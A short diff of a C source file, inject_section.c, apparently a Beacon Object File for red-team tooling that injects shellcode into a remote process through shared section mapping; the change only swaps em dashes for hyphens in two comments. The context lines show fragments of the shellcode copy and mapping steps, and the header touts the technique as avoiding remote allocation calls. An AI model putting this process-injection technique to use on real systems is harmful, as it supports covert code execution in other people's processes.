@@ -1,5 +1,5 @@
 /*
- * inject_section.c — NtCreateSection + NtMapViewOfSection process injection BOF
+ * inject_section.c - NtCreateSection + NtMapViewOfSection process injection BOF
  *
  * Injects shellcode into a remote process via shared section mapping.
  * Superior to VirtualAllocEx because no remote allocation call is made;
@@ -159,7 +159,7 @@ void go(char* args, int len)
         ((char*)localBase)[i] = shellcode[i];
     }
 
-    /* Unmap local view — we no longer need it */
+    /* Unmap local view - we no longer need it */
     NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localBase);
 
     /* Map into remote process as RX */
